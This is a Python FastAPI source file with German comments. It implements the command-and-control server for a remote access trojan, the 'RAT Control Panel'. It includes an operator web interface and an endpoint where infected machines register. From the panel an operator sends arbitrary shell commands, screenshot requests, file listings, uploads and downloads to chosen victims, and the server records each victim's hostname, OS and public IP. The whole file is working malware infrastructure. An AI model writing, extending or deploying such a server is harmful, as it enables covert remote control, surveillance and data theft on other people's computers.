import asyncio
import json
import base64
import os
import secrets
import logging
import websockets
import time
import uvicorn
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Depends, HTTPException, status, Request
from fastapi.responses import FileResponse, HTMLResponse, JSONResponse
from fastapi.security import HTTPBasic, HTTPBasicCredentials
import jwt
from datetime import datetime, timedelta

# --- Globale Variablen & App-Initialisierung ---
RAT_CLIENTS = {}  # client_id: websocket
CLIENT_COUNTER = 1
WEB_UI_SOCKETS = set()  # Unterstützt mehrere Web-UIs
CLIENT_INFOS = {}  # client_id: {hostname, os, ip, last_seen}
CLIENT_LAST_PING = {}  # client_id: timestamp
app = FastAPI()

# --- Basic Auth Konfiguration ---
security = HTTPBasic()
ADMIN_USERNAME = os.getenv("ADMIN_USERNAME", "admin")
ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "supersecretpassword123")

# --- JWT Konfiguration ---
JWT_SECRET = os.getenv("JWT_SECRET", "ratsecretjwt")
JWT_ALGO = "HS256"
JWT_EXP_MINUTES = 120

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")

CLIENT_TIMEOUT = 300  # Sekunden

# --- AUTH-FUNKTION FÜR NORMALE HTTP-ROUTEN ---
async def get_current_user(credentials: HTTPBasicCredentials = Depends(security)):
    correct_username = secrets.compare_digest(credentials.username, ADMIN_USERNAME)
    correct_password = secrets.compare_digest(credentials.password, ADMIN_PASSWORD)
    if not (correct_username and correct_password):
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Falsche Anmeldeinformationen",
            headers={"WWW-Authenticate": "Basic"},
        )
    return credentials.username

# --- JWT Funktionen ---
def create_jwt_token(username: str):
    payload = {
        "sub": username,
        "exp": datetime.utcnow() + timedelta(minutes=JWT_EXP_MINUTES)
    }
    return jwt.encode(payload, JWT_SECRET, algorithm=JWT_ALGO)

def verify_jwt_token(token: str):
    try:
        payload = jwt.decode(token, JWT_SECRET, algorithms=[JWT_ALGO])
        return payload.get("sub")
    except Exception:
        return None

# --- Web-UI Endpunkte ---
@app.post("/login")
async def login(request: Request):
    data = await request.json()
    username = data.get("username")
    password = data.get("password")
    if not username or not password:
        return JSONResponse({"error": "Benutzername und Passwort erforderlich"}, status_code=400)
    if secrets.compare_digest(username, ADMIN_USERNAME) and secrets.compare_digest(password, ADMIN_PASSWORD):
        token = create_jwt_token(username)
        return {"token": token}
    return JSONResponse({"error": "Login fehlgeschlagen"}, status_code=401)

@app.get("/", response_class=HTMLResponse)
async def get_index(request: Request):
    # Erstelle eine einfache HTML-Seite falls index.html nicht existiert
    html_content = """
<!DOCTYPE html>
<html>
<head>
    <title>RAT Control Panel</title>
    <meta charset="UTF-8">
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .login-form { max-width: 400px; margin: 50px auto; padding: 20px; border: 1px solid #ccc; }
        .main-ui { display: none; }
        .client-list { margin: 20px 0; }
        .client-item { padding: 10px; margin: 5px 0; border: 1px solid #ddd; background: #f9f9f9; }
        .client-item.selected { background: #e6f3ff; }
        .command-area { margin: 20px 0; }
        .output-area { height: 300px; overflow-y: auto; border: 1px solid #ccc; padding: 10px; background: #f5f5f5; }
        button { padding: 8px 16px; margin: 5px; }
        input, select { padding: 5px; margin: 5px; }
        .status { padding: 10px; margin: 10px 0; background: #e6ffe6; border: 1px solid #4CAF50; }
    </style>
</head>
<body>
    <div id="login-form" class="login-form">
        <h2>RAT Control Panel Login</h2>
        <input type="text" id="username" placeholder="Username" />
        <input type="password" id="password" placeholder="Password" />
        <button onclick="login()">Login</button>
        <div id="login-error" style="color: red; display: none;"></div>
    </div>

    <div id="main-ui" class="main-ui">
        <h1>RAT Control Panel</h1>
        <div id="status" class="status">Verbinde...</div>
        
        <div class="client-list">
            <h3>Verbundene Clients:</h3>
            <div id="clients"></div>
        </div>

        <div class="command-area">
            <h3>Befehle:</h3>
            <button onclick="sendCommand('systeminfo')">System Info</button>
            <button onclick="sendCommand('screenshot')">Screenshot</button>
            <button onclick="sendCommand('ls', {path: '.'})">Liste Dateien</button>
            <br>
            <input type="text" id="exec-command" placeholder="Befehl eingeben..." />
            <button onclick="executeCommand()">Ausführen</button>
        </div>

        <div class="output-area">
            <h3>Output:</h3>
            <div id="output"></div>
        </div>
    </div>

    <script>
        let ws = null;
        let selectedClient = null;
        let token = localStorage.getItem('rat_token');

        function login() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            fetch('/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username, password })
            })
            .then(response => response.json())
            .then(data => {
                if (data.token) {
                    token = data.token;
                    localStorage.setItem('rat_token', token);
                    document.getElementById('login-form').style.display = 'none';
                    document.getElementById('main-ui').style.display = 'block';
                    connectWebSocket();
                } else {
                    document.getElementById('login-error').style.display = 'block';
                    document.getElementById('login-error').textContent = data.error;
                }
            })
            .catch(error => {
                document.getElementById('login-error').style.display = 'block';
                document.getElementById('login-error').textContent = 'Login fehlgeschlagen';
            });
        }

        function connectWebSocket() {
            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
            ws = new WebSocket(`${protocol}//${window.location.host}/ws?token=${token}`);
            
            ws.onopen = function() {
                document.getElementById('status').textContent = 'Verbunden';
                document.getElementById('status').style.background = '#e6ffe6';
                ws.send(JSON.stringify({action: 'get_clients'}));
            };

            ws.onmessage = function(event) {
                const data = JSON.parse(event.data);
                handleMessage(data);
            };

            ws.onclose = function() {
                document.getElementById('status').textContent = 'Verbindung getrennt';
                document.getElementById('status').style.background = '#ffe6e6';
                setTimeout(connectWebSocket, 5000);
            };

            ws.onerror = function(error) {
                document.getElementById('status').textContent = 'Verbindungsfehler';
                document.getElementById('status').style.background = '#ffe6e6';
            };
        }

        function handleMessage(data) {
            switch(data.type) {
                case 'client_list':
                    updateClientList(data.clients);
                    break;
                case 'client_connected':
                    addOutput(`Client verbunden: ${data.client.hostname} (${data.client.id})`);
                    break;
                case 'client_disconnected':
                    addOutput(`Client getrennt: ${data.client_id}`);
                    break;
                case 'command_output':
                    addOutput(`Output: ${data.output}`);
                    break;
                case 'screenshot':
                    showScreenshot(data.data);
                    break;
                case 'debug':
                    addOutput(`[${data.level}] ${data.msg}`);
                    break;
                case 'error':
                    addOutput(`ERROR: ${data.message}`);
                    break;
            }
        }

        function updateClientList(clients) {
            const clientsDiv = document.getElementById('clients');
            clientsDiv.innerHTML = '';
            
            clients.forEach(client => {
                const div = document.createElement('div');
                div.className = 'client-item';
                div.innerHTML = `
                    <strong>${client.hostname}</strong> (ID: ${client.id})<br>
                    OS: ${client.os}<br>
                    IP: ${client.ip}
                `;
                div.onclick = () => selectClient(client.id, div);
                clientsDiv.appendChild(div);
            });
        }

        function selectClient(clientId, element) {
            selectedClient = clientId;
            document.querySelectorAll('.client-item').forEach(item => {
                item.classList.remove('selected');
            });
            element.classList.add('selected');
            addOutput(`Client ${clientId} ausgewählt`);
        }

        function sendCommand(action, params = {}) {
            if (!selectedClient) {
                addOutput('Kein Client ausgewählt');
                return;
            }
            
            const command = {
                action: action,
                target_id: selectedClient,
                ...params
            };
            
            ws.send(JSON.stringify(command));
        }

        function executeCommand() {
            const command = document.getElementById('exec-command').value;
            if (!command) return;
            
            sendCommand('exec', { command: command });
            document.getElementById('exec-command').value = '';
        }

        function addOutput(message) {
            const output = document.getElementById('output');
            const div = document.createElement('div');
            div.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            output.appendChild(div);
            output.scrollTop = output.scrollHeight;
        }

        function showScreenshot(data) {
            const img = document.createElement('img');
            img.src = 'data:image/png;base64,' + data;
            img.style.maxWidth = '100%';
            
            const output = document.getElementById('output');
            output.appendChild(img);
            output.scrollTop = output.scrollHeight;
        }

        // Enter-Taste für Befehlseingabe
        document.addEventListener('DOMContentLoaded', function() {
            document.getElementById('exec-command').addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    executeCommand();
                }
            });
            
            document.getElementById('password').addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    login();
                }
            });
        });

        // Auto-Login falls Token vorhanden
        if (token) {
            document.getElementById('login-form').style.display = 'none';
            document.getElementById('main-ui').style.display = 'block';
            connectWebSocket();
        }
    </script>
</body>
</html>
    """
    return HTMLResponse(content=html_content)

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    token = websocket.query_params.get("token")
    if not token or not verify_jwt_token(token):
        await websocket.close(code=4401)
        return
    
    await websocket.accept()
    WEB_UI_SOCKETS.add(websocket)
    logging.info("Web-UI verbunden.")
    
    # Sende sofort die Client-Liste
    await send_client_list()
    
    try:
        while True:
            try:
                data = await asyncio.wait_for(websocket.receive_json(), timeout=300)
                
                if data.get("type") == "ping":
                    await websocket.send_json({"type": "pong"})
                    continue

                if data.get("action") == "get_clients":
                    await send_client_list()
                    continue

                # Behandle alle anderen Aktionen
                action = data.get("action")
                target_id = data.get("target_id")
                
                if not target_id:
                    await send_to_web_ui({"type": "error", "message": "Keine Client-ID angegeben"})
                    continue
                
                try:
                    target_id_int = int(target_id)
                except ValueError:
                    await send_to_web_ui({"type": "error", "message": "Ungültige Client-ID"})
                    continue
                
                if target_id_int not in RAT_CLIENTS:
                    await send_to_web_ui({"type": "error", "message": f"Client {target_id_int} nicht verbunden"})
                    continue
                
                target_ws = RAT_CLIENTS[target_id_int]
                payload = {"action": action, "client_id": str(target_id_int)}
                
                # Füge spezifische Parameter hinzu
                if action == "exec":
                    payload["command"] = data.get("command")
                elif action == "download":
                    payload["path"] = data.get("path")
                elif action == "upload":
                    payload["filename"] = data.get("filename")
                    payload["data"] = data.get("data")
                elif action == "ls":
                    payload["path"] = data.get("path", ".")
                
                try:
                    await target_ws.send(json.dumps(payload))
                    await send_to_web_ui({"type": "debug", "level": "info", "msg": f"Befehl '{action}' an Client {target_id_int} gesendet"})
                except Exception as e:
                    await send_to_web_ui({"type": "error", "message": f"Fehler beim Senden an Client {target_id_int}: {str(e)}"})

            except asyncio.TimeoutError:
                # Sende Ping
                await websocket.send_json({"type": "ping"})
                continue
            except WebSocketDisconnect:
                break
            except Exception as e:
                logging.error(f"Fehler im Web-UI Handler: {e}")
                break
                
    except Exception as e:
        logging.error(f"Web-UI Verbindungsfehler: {e}")
    finally:
        if websocket in WEB_UI_SOCKETS:
            WEB_UI_SOCKETS.remove(websocket)
        logging.info("Web-UI getrennt.")

async def send_client_list():
    clients = []
    for cid, ws in RAT_CLIENTS.items():
        client_info = CLIENT_INFOS.get(cid, {})
        clients.append({
            "id": str(cid),
            "hostname": client_info.get("hostname", f"Client {cid}"),
            "address": getattr(ws, 'remote_address', 'unknown'),
            "os": client_info.get("os", ""),
            "ip": client_info.get("ip", ""),
            "last_seen": client_info.get("last_seen", 0),
        })
    await send_to_web_ui({"type": "client_list", "clients": clients})

async def send_to_web_ui(data: dict):
    disconnected = []
    for ws in WEB_UI_SOCKETS:
        try:
            await ws.send(json.dumps(data))
        except Exception:
            disconnected.append(ws)
    
    # Entferne getrennte Verbindungen
    for ws in disconnected:
        WEB_UI_SOCKETS.discard(ws)

@app.websocket("/rat")
async def rat_client_endpoint(websocket: WebSocket):
    global CLIENT_COUNTER
    await websocket.accept()
    client_id = CLIENT_COUNTER
    CLIENT_COUNTER += 1
    RAT_CLIENTS[client_id] = websocket
    
    client_host = websocket.client.host if websocket.client else "unknown"
    client_port = websocket.client.port if websocket.client else 0
    remote_address = (client_host, client_port)
    websocket.remote_address = remote_address
    
    try:
        # Fordere Systeminfos an
        await websocket.send(json.dumps({"action": "systeminfo"}))
        sysinfo_data = await asyncio.wait_for(websocket.receive_json(), timeout=10)
        
        hostname = extract_hostname_from_sysinfo(sysinfo_data.get("output", ""))
        os_name = extract_os_from_sysinfo(sysinfo_data.get("output", ""))
        ip = extract_ip_from_sysinfo(sysinfo_data.get("output", ""))
        
        if not hostname:
            hostname = sysinfo_data.get("hostname", f"Client {client_id}")
        if not os_name:
            os_name = sysinfo_data.get("os", "")
        if not ip:
            ip = sysinfo_data.get("ip", "")
            
    except Exception as e:
        logging.warning(f"Fehler beim Empfangen von Systeminfos: {e}")
        hostname = f"Client {client_id}"
        os_name = ""
        ip = ""
    
    CLIENT_INFOS[client_id] = {
        "hostname": hostname,
        "os": os_name,
        "ip": ip,
        "last_seen": time.time(),
    }
    
    logging.info(f"[+] Neuer RAT-Client verbunden: {hostname} ({remote_address})")
    
    await send_to_web_ui({
        "type": "client_connected",
        "client": {
            "id": str(client_id),
            "hostname": hostname,
            "address": remote_address,
            "os": os_name,
            "ip": ip,
        },
    })
    await send_client_list()

    try:
        while True:
            try:
                data = await asyncio.wait_for(websocket.receive(), timeout=300)
                
                if data["type"] == "websocket.receive":
                    if "text" in data and data["text"]:
                        try:
                            meta = json.loads(data["text"])
                            if meta.get("type") == "ping":
                                CLIENT_INFOS[client_id]["last_seen"] = time.time()
                                continue
                            meta["client_id"] = str(client_id)
                            await send_to_web_ui(meta)
                        except Exception as e:
                            await send_to_web_ui({"type": "debug", "level": "error", "msg": f"Fehler beim Parsen von Client {client_id}: {e}"})
                            
            except asyncio.TimeoutError:
                logging.warning(f"[Client {client_id}] Timeout")
                break
            except WebSocketDisconnect:
                logging.info(f"[Client {client_id}] WebSocket disconnect")
                break
            except Exception as e:
                logging.error(f"Fehler im Client-Handler (Client {client_id}): {e}")
                break
                
    except Exception as e:
        logging.error(f"Unerwarteter Fehler mit Client {client_id}: {e}")
    finally:
        # Cleanup
        if client_id in RAT_CLIENTS:
            del RAT_CLIENTS[client_id]
        if client_id in CLIENT_INFOS:
            del CLIENT_INFOS[client_id]
        
        await send_to_web_ui({"type": "client_disconnected", "client_id": str(client_id)})
        await send_client_list()
        logging.info(f"[-] RAT-Client {client_id} getrennt")

def extract_hostname_from_sysinfo(sysinfo: str) -> str:
    for line in sysinfo.splitlines():
        if line.lower().startswith("hostname:") or line.lower().startswith("host:"):
            return line.split(":", 1)[1].strip()
    return ""

def extract_os_from_sysinfo(sysinfo: str) -> str:
    for line in sysinfo.splitlines():
        if line.lower().startswith("os:"):
            return line.split(":", 1)[1].strip()
    return ""

def extract_ip_from_sysinfo(sysinfo: str) -> str:
    for line in sysinfo.splitlines():
        if "öffentliche ip" in line.lower() or "public ip" in line.lower():
            return line.split(":", 1)[1].strip()
    return ""

async def cleanup_inactive_clients():
    while True:
        now = time.time()
        to_remove = []
        for cid, info in list(CLIENT_INFOS.items()):
            if now - info.get("last_seen", now) > CLIENT_TIMEOUT:
                to_remove.append(cid)
        for cid in to_remove:
            logging.warning(f"Entferne inaktiven Client {cid}")
            if cid in RAT_CLIENTS:
                try:
                    await RAT_CLIENTS[cid].close()
                except Exception:
                    pass
                del RAT_CLIENTS[cid]
            if cid in CLIENT_INFOS:
                del CLIENT_INFOS[cid]
            await send_to_web_ui({"type": "client_disconnected", "client_id": str(cid)})
            await send_client_list()
        await asyncio.sleep(60)

if __name__ == "__main__":
    port = int(os.getenv("PORT", 8000))
    loop = asyncio.get_event_loop()
    loop.create_task(cleanup_inactive_clients())
    uvicorn.run(app, host="0.0.0.0", port=port)